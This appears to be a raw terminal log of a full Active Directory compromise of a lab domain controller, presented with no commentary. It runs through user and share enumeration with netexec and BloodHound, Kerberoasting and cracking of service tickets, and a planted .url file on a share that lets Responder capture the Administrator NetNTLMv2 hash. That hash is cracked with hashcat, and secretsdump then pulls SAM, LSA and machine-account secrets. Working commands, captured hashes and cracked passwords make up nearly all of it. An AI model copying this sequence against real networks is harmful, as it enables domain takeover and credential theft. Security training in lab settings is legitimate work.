+SMB         192.168.56.10   445    DC01             mada.bren                     2026-09-26 20:28:14 0        
+SMB         192.168.56.10   445    DC01             imojean.glory                 2026-09-26 20:28:14 0        
+SMB         192.168.56.10   445    DC01             peggie.helli                  2026-09-26 20:28:14 0        
+SMB         192.168.56.10   445    DC01             letta.lorene                  2026-09-26 20:28:14 0        
+SMB         192.168.56.10   445    DC01             codee.nessa                   2026-09-26 20:28:14 0        
+SMB         192.168.56.10   445    DC01             aida.kristi                   2026-09-26 20:28:14 0        
+SMB         192.168.56.10   445    DC01             bobbee.malina                 2026-09-26 20:28:15 0        
+SMB         192.168.56.10   445    DC01             eadith.nicole                 2026-09-26 20:28:15 0        
+SMB         192.168.56.10   445    DC01             conchita.celestyna            2026-09-26 20:28:15 0        
+SMB         192.168.56.10   445    DC01             barbi.elana                   2026-09-26 20:28:15 0        
+SMB         192.168.56.10   445    DC01             ermina.joanne                 2026-09-26 20:28:15 0        
+SMB         192.168.56.10   445    DC01             krissy.natassia               2026-09-26 20:28:15 0        
+SMB         192.168.56.10   445    DC01             jemima.emilie                 2026-09-26 20:28:16 0        
+SMB         192.168.56.10   445    DC01             hermione.merci                2026-09-26 20:28:16 0        
+SMB         192.168.56.10   445    DC01             aurore.aubrette               2026-09-26 20:28:16 0        
+SMB         192.168.56.10   445    DC01             sharon.nani                   2026-09-26 20:28:16 0        
+SMB         192.168.56.10   445    DC01             renate.phil                   2026-09-26 20:28:16 0        
+SMB         192.168.56.10   445    DC01             christen.orly                 2026-09-26 20:28:16 0        
+SMB         192.168.56.10   445    DC01             fanya.beryl                   2026-09-26 20:28:16 0        
+SMB         192.168.56.10   445    DC01             cheri.etta                    2026-09-26 20:28:17 0        
+SMB         192.168.56.10   445    DC01             genia.filide                  2026-09-27 16:30:27 0       New User ,DefaultPassword 
+SMB         192.168.56.10   445    DC01             drusy.isabelita               2026-09-26 20:28:17 0        
+SMB         192.168.56.10   445    DC01             may.asia                      2026-09-26 20:28:17 0        
+SMB         192.168.56.10   445    DC01             pammy.dasi                    2026-09-26 20:28:17 0        
+SMB         192.168.56.10   445    DC01             coretta.eveleen               2026-09-26 20:28:17 0        
+SMB         192.168.56.10   445    DC01             dawn.eugenie                  2026-09-26 20:28:17 0        
+SMB         192.168.56.10   445    DC01             maurizia.allsun               2026-09-26 20:28:18 0        
+SMB         192.168.56.10   445    DC01             selle.emalee                  2026-09-26 20:28:18 0        
+SMB         192.168.56.10   445    DC01             dulcia.paulette               2026-09-26 20:28:18 0        
+SMB         192.168.56.10   445    DC01             inez.emmalynne                2026-09-26 20:28:18 0     
+
+
+
+
+❯ nxc smb 192.168.56.10 -d cs.org  -u 'genia.filide' -p 'Changeme123!' --local-groups
+SMB         192.168.56.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:cs.org) (signing:False) (SMBv1:False) (Null Auth:True) (DC:True)
+SMB         192.168.56.10   445    DC01             [+] cs.org\genia.filide:Changeme123! 
+SMB         192.168.56.10   445    DC01             [*] Enumerating with SAMRPC protocol
+SMB         192.168.56.10   445    DC01             [+] Enumerated local groups
+SMB         192.168.56.10   445    DC01             549 - Server Operators
+SMB         192.168.56.10   445    DC01             548 - Account Operators
+SMB         192.168.56.10   445    DC01             554 - Pre-Windows 2000 Compatible Access
+SMB         192.168.56.10   445    DC01             557 - Incoming Forest Trust Builders
+SMB         192.168.56.10   445    DC01             560 - Windows Authorization Access Group
+SMB         192.168.56.10   445    DC01             561 - Terminal Server License Servers
+SMB         192.168.56.10   445    DC01             544 - Administrators
+SMB         192.168.56.10   445    DC01             545 - Users
+SMB         192.168.56.10   445    DC01             546 - Guests
+SMB         192.168.56.10   445    DC01             550 - Print Operators
+SMB         192.168.56.10   445    DC01             551 - Backup Operators
+SMB         192.168.56.10   445    DC01             552 - Replicator
+SMB         192.168.56.10   445    DC01             555 - Remote Desktop Users
+SMB         192.168.56.10   445    DC01             556 - Network Configuration Operators
+SMB         192.168.56.10   445    DC01             558 - Performance Monitor Users
+SMB         192.168.56.10   445    DC01             559 - Performance Log Users
+SMB         192.168.56.10   445    DC01             562 - Distributed COM Users
+SMB         192.168.56.10   445    DC01             568 - IIS_IUSRS
+SMB         192.168.56.10   445    DC01             569 - Cryptographic Operators
+SMB         192.168.56.10   445    DC01             573 - Event Log Readers
+SMB         192.168.56.10   445    DC01             574 - Certificate Service DCOM Access
+SMB         192.168.56.10   445    DC01             575 - RDS Remote Access Servers
+SMB         192.168.56.10   445    DC01             576 - RDS Endpoint Servers
+SMB         192.168.56.10   445    DC01             577 - RDS Management Servers
+SMB         192.168.56.10   445    DC01             578 - Hyper-V Administrators
+SMB         192.168.56.10   445    DC01             579 - Access Control Assistance Operators
+SMB         192.168.56.10   445    DC01             580 - Remote Management Users
+SMB         192.168.56.10   445    DC01             582 - Storage Replica Administrators
+SMB         192.168.56.10   445    DC01             517 - Cert Publishers
+SMB         192.168.56.10   445    DC01             553 - RAS and IAS Servers
+SMB         192.168.56.10   445    DC01             571 - Allowed RODC Password Replication Group
+SMB         192.168.56.10   445    DC01             572 - Denied RODC Password Replication Group
+SMB         192.168.56.10   445    DC01             1101 - DnsAdmins
+
+
+
+
+❯ nxc smb 192.168.56.10 -d cs.org  -u 'genia.filide' -p 'Changeme123!' --pass-pol
+SMB         192.168.56.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:cs.org) (signing:False) (SMBv1:False) (Null Auth:True) (DC:True)
+SMB         192.168.56.10   445    DC01             [+] cs.org\genia.filide:Changeme123! 
+SMB         192.168.56.10   445    DC01             [+] Dumping password info for domain: cs
+SMB         192.168.56.10   445    DC01             Minimum password length: 4
+SMB         192.168.56.10   445    DC01             Password history length: 24
+SMB         192.168.56.10   445    DC01             Maximum password age: 41 days 23 hours 53 minutes 
+SMB         192.168.56.10   445    DC01             
+SMB         192.168.56.10   445    DC01             Password Complexity Flags: 000000
+SMB         192.168.56.10   445    DC01                 Domain Refuse Password Change: 0
+SMB         192.168.56.10   445    DC01                 Domain Password Store Cleartext: 0
+SMB         192.168.56.10   445    DC01                 Domain Password Lockout Admins: 0
+SMB         192.168.56.10   445    DC01                 Domain Password No Clear Change: 0
+SMB         192.168.56.10   445    DC01                 Domain Password No Anon Change: 0
+SMB         192.168.56.10   445    DC01                 Domain Password Complex: 0
+SMB         192.168.56.10   445    DC01             
+SMB         192.168.56.10   445    DC01             Minimum password age: 1 day 4 minutes 
+SMB         192.168.56.10   445    DC01             Reset Account Lockout Counter: 1 minute 
+SMB         192.168.56.10   445    DC01             Locked Account Duration: 1 minute 
+SMB         192.168.56.10   445    DC01             Account Lockout Threshold: None
+SMB         192.168.56.10   445    DC01             Forced Log off Time: Not Set
+
+
+
+❯ nxc smb 192.168.56.10 -d cs.org  -u 'genia.filide' -p 'Changeme123!' --shares
+SMB         192.168.56.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:cs.org) (signing:False) (SMBv1:False) (Null Auth:True) (DC:True)
+SMB         192.168.56.10   445    DC01             [+] cs.org\genia.filide:Changeme123! 
+SMB         192.168.56.10   445    DC01             [*] Enumerated shares
+SMB         192.168.56.10   445    DC01             Share           Permissions            Remark
+SMB         192.168.56.10   445    DC01             -----           -----------            ------
+SMB         192.168.56.10   445    DC01             ADMIN$                                 Remote Admin
+SMB         192.168.56.10   445    DC01             C$                                     Default share
+SMB         192.168.56.10   445    DC01             IPC$            READ                   Remote IPC
+SMB         192.168.56.10   445    DC01             LabShare        READ                   
+SMB         192.168.56.10   445    DC01             NETLOGON        READ                   Logon server share 
+SMB         192.168.56.10   445    DC01             SYSVOL          READ                   Logon server share 
+
+
+
+
+
+
+
+
+❯ bloodhound-python -u 'genia.filide' -p 'Changeme123!' -d cs.org -dc DC01.cs.org -ns 192.168.56.10 -c All --zip
+INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+INFO: Found AD domain: cs.org
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: DC01.cs.org
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: DC01.cs.org
+INFO: Found 107 users
+INFO: Found 60 groups
+INFO: Found 2 gpos
+INFO: Found 1 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: DC01.cs.org
+INFO: Done in 00M 01S
+INFO: Compressing output into 20260927194944_bloodhound.zip
+
+
+
+
+HTTP_SVC$@CS.ORG
+http_svc/httpserver.cs.org
+
+MSSQL_SVC$@CS.ORG
+mssql_svc/mssqlserver.cs.org
+
+
+
+
+
+❯ nxc ldap 192.168.56.10 -u 'genia.filide' -p 'Changeme123!' -d CS.ORG --kerberoasting kerberoast.txt
+LDAP        192.168.56.10   389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:CS.ORG) (signing:None) (channel binding:No TLS cert) 
+LDAP        192.168.56.10   389    DC01             [+] CS.ORG\genia.filide:Changeme123! 
+LDAP        192.168.56.10   389    DC01             [*] Skipping disabled account: krbtgt
+LDAP        192.168.56.10   389    DC01             [*] Total of records returned 3
+LDAP        192.168.56.10   389    DC01             [*] sAMAccountName: exchange_svc$, memberOf: [], pwdLastSet: 2026-09-26 23:28:23.561870, lastLogon: <never>
+LDAP        192.168.56.10   389    DC01             $krb5tgs$18$hostexchange_svc.cs.org$CS.ORG$*cs.org\exchange_svc$*$f3fa103806e5377688339d47$128efede9699aa840f8660c1c0e62bede7cd4561a78a79ae0f5bc57aa34a236f60181b2da50acf1cc2c0541149afdd0c1f984067bcc8b41c7f063d7e6fd93d3c63d4e19cd22124dd1f8a9cbdaa3667570724842c197a15206ce27583e4d98846fc65c33a42b4ac9774311a87ba60b0121dac52d82cc7901c0bee5e7c4bef2419577f62f42ee28ae73f9b7a7a306d4d26e5c433b7c1a62226eb06c51ffde49b6adf2defbf39022d15d454507c542793fe2ce5f341b59f53c3b619faa8f03bfb4a471d2cb79b02c50eaed99f9198df627281c04c1299f9e23e2fbd115222c7c45fda91e88714b5371b3fe206af3d7c0171e45bfeaee9e996adaf17940b662e603b0c4b8ef54b76b817eac797b4202ef6038a604637e8c2def33168653fa30742c7b66c46f30a0fce39ddac49b393b194aa01950218d634f96783cf8922e0dc495014a88ed3450d1e5e0cdd5cc7a184a9a613873af445c156e8817332057a6181bd2140443a9db20a520d6bd61ae379e1d88dedabd55195eb0eef4890872b5eedcadeba8f0e2103410e9afe0b47ee4c5ff483dfa2cb2e74fab1ce5dc677c4d8932073b80440e0c58e403264d175e64ef4c584ee209c70f16b9c57c4628137f0fa5812d4629ee1f51c89f38e33eef74191205e7e775536cb0a8f4627d2d3c34d609442b3db83b299075b367adf2f5cf2d4d1453549908e2cd6b490332e2442153b1f17bc42511775e606b8b125f60fb309b5bba7bd6534e28a1b095cf0ef61009f3185315843d7933b96f5beaf7c3df4258a8b385a856b9ffd55a6b3b236ab19668de7e8498ba07ff6f07a9ea67d3001ec4923463c403daac47c86ae47e7188128930cbbc0399b56a25e0d38c8495c024f9cb76696cf4d284bead84ac60ce2773fc72310274261d8ea2c703688f5ad7aea17d04b1719cb9184fd01d8c57bef00be8832a61118827353aac9446a7f84d874ca8e7e3940d99ef21698270458111b8587e9f3b4c50a64aeb8d150396c5484515b7b718c17003ad5d26f6e80a75cc3bfe1d2161fa4b2e0ffe32c59cf64392f463d8733880c48aebe426608ba42edf8ece7e4a79051b22129afc6e1705f40322d6595d42a1537683eb8038246672ffa0369604dcfeb1208256aedd01196e3e4ad22ae3660b181c3f829052a68548d8211843bfef318e36b5a39e9b7326bc18acebf22d1050da486cb7480b447c62962b44ebcf3e6123ca093ebdc7385dce2ae2b718879984c67da04cbab56bb036684113db8d8ea01bc6eaedb645e012330ff8edd97839ca71d26d061567d74fa34646c0d73d1435ddc8ee1fdf44bc50cd7cad8b3196a829f42a559ef5f08f145a9fb7f4edb91ff975eb183232d566221d4149dd0050cba48b352d26838b522f27e7cc27c9737b9c81ce37282cd858444b5d0177f35b58a5f0ac2ffad4901ed
+LDAP        192.168.56.10   389    DC01             [*] sAMAccountName: http_svc$, memberOf: [], pwdLastSet: 2026-09-26 23:28:23.880597, lastLogon: <never>
+LDAP        192.168.56.10   389    DC01             $krb5tgs$18$hosthttp_svc.cs.org$CS.ORG$*cs.org\http_svc$*$023dc9074ab716f53a896594$bb4d4b9ce41bc28dfbdbd258c28960f82b137a123e1eb5b1d0ac1dae9c36da51bb37be58e39ab54791669d7edcef21b3375067f1d54a8e26179fc4b10b1f6f141e2291e0d898e469cc798be861b6b5491c7b4850b6f346e5bb681a18f94f234a77b9ebb4060169ad3c2efba0e4f40025d835e654212615f765a17b54622de9f6ea4af64a129ecedcadc858136e6a5699845167da5cfff38da57a76ba336495736cd5c8315777c5d920f4c17e5ccecba91753a21903a533d6b94033c1ca5e02a41e8044d25b6444a1e7b9f68ae4e516a6c3c61db8e07b4eec77349fbdb375b45f32a45409e53c361b1ae16570c35e991b0936fedab675f4eec7a704fae1b1772bc99108695145a47f5c600f3a9dcec6b67efe9925943b6ba266332e4f595fe1bbcebeccb717f629f8f395049058fba5d842ec4ad36e526309529c7b5cd32680d3e8a5865941e4e890f0aad91fc45a497fc5c6d5de8c53b937696006e986b12db46ba486179b5afaa0319cedf887d2d841eea15a6597ea248edd7187a700c2bca839a2a8aa3906082e376fd2762713117a6c7b763c179247be59e4761d0996d80bf0cec00f4f54114ac2e7c62366cc066e10616a6d723f217fc3cce579832220d81d7df3ed2ae9b08da4d6b0e794f4f7611ae8c4848e221e7e93a6c58b716606120ef1dd0bc4e79111e0d0072d1a1fd20a4147373d916fa470f3460f8b9a688223e04871eb69f9fb5f7a1f16ea2fda8f73e8695e88ba1128e3485ef7bf23ce38a888f6e366b0c63299eea84cdbc4255293dbe3aa03dc035b128acd8ccac702ec768155809e7042b2b079c122f5d3a4a8c6800b53463e602ba7004415f23beffef2fe114dfb6df6133aa22379301540cefd4cb279071615a98eff070e6b2fc44dcfdd5f46c00c7189d26e340535b1f7b0ab2944583c517940db92dc878598be89b54cd2067865db6ae22190f6d18ecd647f379350ac68b3a503d97b2a190ed582597e8990ccfcdb2ca329ecda9e62797fa19fe2b033dc104439045aa9fd9cc728ed1d1169f2038b51d4eedd508d5413342691968d19d9404938abd2d605ce5351601ae90df0b4af02cd4c7c6424933903ebc3947dbdbf1d91b000aabc6db1d34092b76c95cea8b3fe5eaca26a3308b54e44a696325dee6ace56d6f7745c6f7d5822c6219a4f1c6121df70aff087d7cec915cf09c64d0a469296b4fd9f58da5a5d022f224155e1ff658c0d2cff7586890be5d18714e464507101aa89014bb8ff1e92eca58516bbf9107a113e0b01f6f97f32410d57215c0c73541cf71a8ecc4c684ed84cce0dcfcf462157fb6f8f38356478f7eb26a32b61c4154235fbd92dea994bfc419c89a8b7caa2050b9b9d528b9920a8f9c2e7d03e74d731de1c6c0653a4ba06b4d2470045c21a6dd264a2a68adfa7221718a4db83bf8e1e1f53
+LDAP        192.168.56.10   389    DC01             [*] sAMAccountName: mssql_svc$, memberOf: [], pwdLastSet: 2026-09-26 23:28:23.746050, lastLogon: <never>
+LDAP        192.168.56.10   389    DC01             $krb5tgs$18$hostmssql_svc.cs.org$CS.ORG$*cs.org\mssql_svc$*$53d34d1362179247f8b47617$2953f82c8e23c7ece18073dc818c4e7431aac4418efbabaeff5429d17ffbb90204627f32c1cc4acdca39e7c19d2f3d938d6c7c8762d9eba104b481a1c176be57fa099e79f4f72e6f43c9d1dd474d4bf45815f298d18af26a763974b0da5a62e9fbba1ced5a44c25a916a135af9c66b7e467c76c12d7beeacaa2aa07f624387f7e99ffadb77b3fe43610aaaabbac6054295df700194892fda02786f873d588f47461a69a7f063fee687b7d028f96e03db94ac4c6712edbf0d62e58382a1a420159482d0683d354ab28e46de9992ed93baecdc056301618ba92d4448a508e243814c323608dfb24cf3c335b5c9e6ef2bf1f734add4a4803b7b8637fc4b3910d01076d209bba62241e294b316a306917c30774f4feb8f1ca18c8189f5eb6cd374d6c60f9ec3ffd57ec983bfdb84cf2e85d61976831dbba8b9d4548b5b0a38605e71a1d47961b5d09950bff5ea3a05b48e31e291e22e13477ac19f463e83ec21712c017b3d4e93bcb2ec41bf3b01af1eb963ce6d4694cbb2486d1c56b1682d88fb74605e3a5cb0d8cbec125b1173e35252093357da1383034a5ecc1f183f160f061ff476fc761fa3dffa77e35cd650803bc6bc4faf2c6f9bc8948f28d8dc52ca0f2cb03b6957917cff25c7ccb84cefa96f680b5315856f3f25d49c94709e02cbd3aedc586caf26dd3ead943e88be86c04ba7b45086e7bcd763e670ccbc8e667ab61327a8db67b0cb0977787573d882d86bd467d202e53d60967df5967c35e8c018cbee88a544f8dd8c302f183dd5741c4b7e9f1bfbde05c082c75f6466cce0b4ab241ab73465f5f345343fc36f6ee5b24ea2c9e06fef71e25c65e564a3f5877f8b6c3c316492f52b78e320e1cec3ed1f0fbc14c22bdb2ac6c5c7ea17cb2c45c504e1bb048c8800f476b61bd036832171a171de392998e00294bdb3a311dfb7453b1e2119ce527cee681c9d0bee643b10a08f958c33fdd724d12c42b5435be2f4d9c86c8f682560da8ae399beb942a74e56e30464c5203de6c2156f9783b90b28039cea37969b53a4d17663aceaf40581256d68255259e5e1c379fca7f1cb6a37b0bcece570dc95acdfe3766fbe6579939e5d2bb05d1859fad3bbf63499e6eca9b05cf7bdad0c628b784589285bb6fa1366fe6d5e0d0ba470390bada1a3f19465abd587711fe7cca5dd0ffb0d5badfcedfcb54b930aeb4ad84c980b47cff719d2598b1e99717d5268404bf3450da8831ef20f4ccc7716a757a95de77a2f7e2a21e5fd35508cd6ceb50cb2c9d595660d2ad84ec499764e91ad4ed90ff32c806d9dcdee16a002c843fd32f21fe4ff20d53f1abdf8aa229e254e8e1b927bd88786980d635a2be496d13082f040906c357da0da4e2b7cd5c8cca45ce7cebd80b22931683b98dd4c71e8ac692d49c6819aa1503693316d2fcd7ce4e99f44397b
+
+
+
+
+$krb5tgs$18$hostexchange_svc.cs.org$CS.ORG$f3fa103806e5377688339d47$128efede9699aa840f8660c1c0e62bede7cd4561a78a79ae0f5bc57aa34a236f60181b2da50acf1cc2c0541149afdd0c1f984067bcc8b41c7f063d7e6fd93d3c63d4e19cd22124dd1f8a9cbdaa3667570724842c197a15206ce27583e4d98846fc65c33a42b4ac9774311a87ba60b0121dac52d82cc7901c0bee5e7c4bef2419577f62f42ee28ae73f9b7a7a306d4d26e5c433b7c1a62226eb06c51ffde49b6adf2defbf39022d15d454507c542793fe2ce5f341b59f53c3b619faa8f03bfb4a471d2cb79b02c50eaed99f9198df627281c04c1299f9e23e2fbd115222c7c45fda91e88714b5371b3fe206af3d7c0171e45bfeaee9e996adaf17940b662e603b0c4b8ef54b76b817eac797b4202ef6038a604637e8c2def33168653fa30742c7b66c46f30a0fce39ddac49b393b194aa01950218d634f96783cf8922e0dc495014a88ed3450d1e5e0cdd5cc7a184a9a613873af445c156e8817332057a6181bd2140443a9db20a520d6bd61ae379e1d88dedabd55195eb0eef4890872b5eedcadeba8f0e2103410e9afe0b47ee4c5ff483dfa2cb2e74fab1ce5dc677c4d8932073b80440e0c58e403264d175e64ef4c584ee209c70f16b9c57c4628137f0fa5812d4629ee1f51c89f38e33eef74191205e7e775536cb0a8f4627d2d3c34d609442b3db83b299075b367adf2f5cf2d4d1453549908e2cd6b490332e2442153b1f17bc42511775e606b8b125f60fb309b5bba7bd6534e28a1b095cf0ef61009f3185315843d7933b96f5beaf7c3df4258a8b385a856b9ffd55a6b3b236ab19668de7e8498ba07ff6f07a9ea67d3001ec4923463c403daac47c86ae47e7188128930cbbc0399b56a25e0d38c8495c024f9cb76696cf4d284bead84ac60ce2773fc72310274261d8ea2c703688f5ad7aea17d04b1719cb9184fd01d8c57bef00be8832a61118827353aac9446a7f84d874ca8e7e3940d99ef21698270458111b8587e9f3b4c50a64aeb8d150396c5484515b7b718c17003ad5d26f6e80a75cc3bfe1d2161fa4b2e0ffe32c59cf64392f463d8733880c48aebe426608ba42edf8ece7e4a79051b22129afc6e1705f40322d6595d42a1537683eb8038246672ffa0369604dcfeb1208256aedd01196e3e4ad22ae3660b181c3f829052a68548d8211843bfef318e36b5a39e9b7326bc18acebf22d1050da486cb7480b447c62962b44ebcf3e6123ca093ebdc7385dce2ae2b718879984c67da04cbab56bb036684113db8d8ea01bc6eaedb645e012330ff8edd97839ca71d26d061567d74fa34646c0d73d1435ddc8ee1fdf44bc50cd7cad8b3196a829f42a559ef5f08f145a9fb7f4edb91ff975eb183232d566221d4149dd0050cba48b352d26838b522f27e7cc27c9737b9c81ce37282cd858444b5d0177f35b58a5f0ac2ffad4901ed:killer
+exchange_svc$:killer
+
+
+
+
+
+❯ ldapdomaindump -u 'CS.ORG\genia.filide' -p 'Changeme123!' 192.168.56.10 -o ldapoutput
+[*] Connecting to host...
+[*] Binding to host
+[+] Bind OK
+[*] Starting domain dump
+[+] Domain dump finished
+❯ ls
+20260927194944_bloodhound.zip          screenshot_20260927_175653-region.png  screenshot_20260927_194013-region.png  screenshot_20260927_200813-region.png
+kerberoast.txt                         screenshot_20260927_184543-region.png  screenshot_20260927_194019-region.png  screenshot_20260927_202859-region.png
+ldapoutput                             screenshot_20260927_191158-region.png  screenshot_20260927_194243-region.png  screenshot_20260927_203432-region.png
+PasswordList.txt                       screenshot_20260927_192256-region.png  screenshot_20260927_194442-region.png  username.txt
+screenshot_20260927_154133-region.png  screenshot_20260927_192403-region.png  screenshot_20260927_194601-region.png  valid_usernames.txt
+screenshot_20260927_154734-region.png  screenshot_20260927_193116-region.png  screenshot_20260927_195009-region.png
+❯ cd ldapoutput
+❯ ls
+domain_computers_by_os.html  domain_computers.json  domain_groups.json  domain_policy.json  domain_trusts.json          domain_users.html
+domain_computers.grep        domain_groups.grep     domain_policy.grep  domain_trusts.grep  domain_users_by_group.html  domain_users.json
+domain_computers.html        domain_groups.html     domain_policy.html  domain_trusts.html  domain_users.grep
+❯ grep -i password domain_users.grep
+Genia Filide	Genia Filide	genia.filide		Domain Users	09/26/26 20:28:17	09/27/26 16:30:50	09/27/26 17:28:41	NORMAL_ACCOUNT	09/27/26 16:30:27	S-1-5-21-79771789-2455041398-3787107133-1193	 New User ,DefaultPassword	
+Anthia Nari	Anthia Nari	anthia.nari		Domain Users	09/26/26 20:28:13	09/27/26 16:39:17	09/27/26 17:59:35	NORMAL_ACCOUNT	09/26/26 20:28:24	S-1-5-21-79771789-2455041398-3787107133-1172	 User Password +eanIM|J$/}w	
+Lou Maureen	Lou Maureen	lou.maureen		Domain Users	09/26/26 20:28:11	09/27/26 16:22:26	09/27/26 16:22:44	NORMAL_ACCOUNT, DONT_REQ_PREAUTH	09/27/26 16:22:26	S-1-5-21-79771789-2455041398-3787107133-1157	New User ,DefaultPassword	
+krbtgt	krbtgt	krbtgt	Denied RODC Password Replication Group	Domain Users	09/26/26 20:14:57	09/26/26 20:30:15	01/01/01 00:00:00	ACCOUNT_DISABLED, NORMAL_ACCOUNT	09/26/26 20:14:58	S-1-5-21-79771789-2455041398-3787107133-502	Key Distribution Center Service Account	kadmin/changepw
+❯ cat domain_computers.grep
+cn	sAMAccountName	dNSHostName	operatingSystem	operatingSystemServicePack	operatingSystemVersion	lastLogon	userAccountControl	whenCreated	objectSid	description
+http_svc	http_svc$					01/01/01 00:00:00	WORKSTATION_ACCOUNT	09/26/26 20:28:23	S-1-5-21-79771789-2455041398-3787107133-1213	
+mssql_svc	mssql_svc$					01/01/01 00:00:00	WORKSTATION_ACCOUNT	09/26/26 20:28:23	S-1-5-21-79771789-2455041398-3787107133-1212	
+exchange_svc	exchange_svc$					01/01/01 00:00:00	WORKSTATION_ACCOUNT	09/26/26 20:28:23	S-1-5-21-79771789-2455041398-3787107133-1211	
+DC01	DC01$	DC01.cs.org	Windows Server 2022 Standard Evaluation		10.0 (20348)	09/27/26 17:03:57	SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION	09/26/26 20:14:56	S-1-5-21-79771789-2455041398-3787107133-1000	
+~/Desktop/DEPI/Domain_2/vulen AD/ldapoutput ❯  
+
+
+
+
+
+❯ smbclient  //192.168.56.10/LabShare  -U 'CS.ORG/genia.filide%Changeme123!'
+Can't load /etc/samba/smb.conf - run testparm to debug it
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Tue Sep 29 15:44:37 2026
+  ..                                DHS        0  Sun Sep 27 17:33:54 2026
+
+		12942591 blocks of size 4096. 10005360 blocks available
+smb: \> put Shortcut.url 
+putting file Shortcut.url as \Shortcut.url (8.3 kB/s) (average 8.3 kB/s)
+smb: \> dir
+  .                                   D        0  Tue Sep 29 15:52:44 2026
+  ..                                DHS        0  Sun Sep 27 17:33:54 2026
+  Shortcut.url                        A      110  Tue Sep 29 15:52:44 2026
+
+		12942591 blocks of size 4096. 10004442 blocks available
+smb: \> 
+
+
+
+
+
+[*] Version: Responder 3.2.2.0
+[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
+
+[+] Listening for events...
+
+[!] Error starting TCP server on port 53, check permissions or other servers running.
+[SMB] NTLMv2-SSP Client   : 192.168.56.10
+[SMB] NTLMv2-SSP Username : cs\Administrator
+[SMB] NTLMv2-SSP Hash     : Administrator::cs:9cc473369ce0f665:637C3ECB12BD38EFDABF3FA98DD8A3D5:0101000000000000004720672A50DD01D10AD50008D465A20000000002000800380041004B004C0001001E00570049004E002D004A00580044004F004400390053005A0051005100410004003400570049004E002D004A00580044004F004400390053005A005100510041002E00380041004B004C002E004C004F00430041004C0003001400380041004B004C002E004C004F00430041004C0005001400380041004B004C002E004C004F00430041004C0007000800004720672A50DD01060004000200000008003000300000000000000000000000003000000306F893C882572FB1CCA491A94A57E29780879E86CFA682BDBC2E9CC382F6CE0A001000000000000000000000000000000000000900220063006900660073002F003100390032002E003100360038002E00350036002E0031000000000000000000
+
+
+
+
+
+
+
+Dictionary cache built:
+* Filename..: pass.txt
+* Passwords.: 5
+* Bytes.....: 57
+* Keyspace..: 5
+* Runtime...: 0 secs
+
+The wordlist or mask that you are using is too small.
+This means that hashcat cannot use the full parallel power of your device(s).
+Hashcat is expecting at least 519168 base words but only got 0.0% of that.
+Unless you supply more work, your cracking speed will drop.
+For tips on supplying more work, see: https://hashcat.net/faq/morework
+
+Approaching final keyspace - workload adjusted.           
+
+ADMINISTRATOR::cs:9cc473369ce0f665:637c3ecb12bd38efdabf3fa98dd8a3d5:0101000000000000004720672a50dd01d10ad50008d465a20000000002000800380041004b004c0001001e00570049004e002d004a00580044004f004400390053005a0051005100410004003400570049004e002d004a00580044004f004400390053005a005100510041002e00380041004b004c002e004c004f00430041004c0003001400380041004b004c002e004c004f00430041004c0005001400380041004b004c002e004c004f00430041004c0007000800004720672a50dd01060004000200000008003000300000000000000000000000003000000306f893c882572fb1cca491a94a57e29780879e86cfa682bdbc2e9cc382f6ce0a001000000000000000000000000000000000000900220063006900660073002f003100390032002e003100360038002e00350036002e0031000000000000000000:eyadeltaher@0
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 5600 (NetNTLMv2)
+Hash.Target......: ADMINISTRATOR::cs:9cc473369ce0f665:637c3ecb12bd38ef...000000
+Time.Started.....: Tue Sep 29 16:00:08 2026, (0 secs)
+Time.Estimated...: Tue Sep 29 16:00:08 2026, (0 secs)
+Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
+Guess.Base.......: File (pass.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#01........:    17177 H/s (0.05ms) @ Accel:507 Loops:1 Thr:64 Vec:1
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 5/5 (100.00%)
+Rejected.........: 0/5 (0.00%)
+Restore.Point....: 0/5 (0.00%)
+Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#01...: Changeme123! -> eyadeltaher@0
+Hardware.Mon.#01.: Temp: 49c Util: 39% Core: 825MHz Mem:4001MHz Bus:16
+
+Started: Tue Sep 29 16:00:05 2026
+Stopped: Tue Sep 29 16:00:09 2026
+
+
+
+ADMINISTRATOR:eyadeltaher@0
+
+
+
+
+
+
+
+
+
+
+❯ secretsdump.py 'CS.ORG/Administrator:eyadeltaher@0@192.168.56.10' -outputfile /home/eyad/Desktop/DEPI/Domain_2/vulen\ AD/secretdump.txt
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Service RemoteRegistry is in stopped state
+[*] Starting service RemoteRegistry
+[*] Target system bootKey: 0xac357535729d3abb9c2bde8bec7984e8
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:671033c111b0bbc33562674998092db3:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+cs\DC01$:aes256-cts-hmac-sha1-96:efc5a737d9bec29bdddc748a1d5481e92fe0445a1d1b7dfc1463c1e2523319a3
+cs\DC01$:aes128-cts-hmac-sha1-96:5196d754a17201df343a7bc6caa5a32f
+cs\DC01$:des-cbc-md5:0d2c58fe8038ec6e
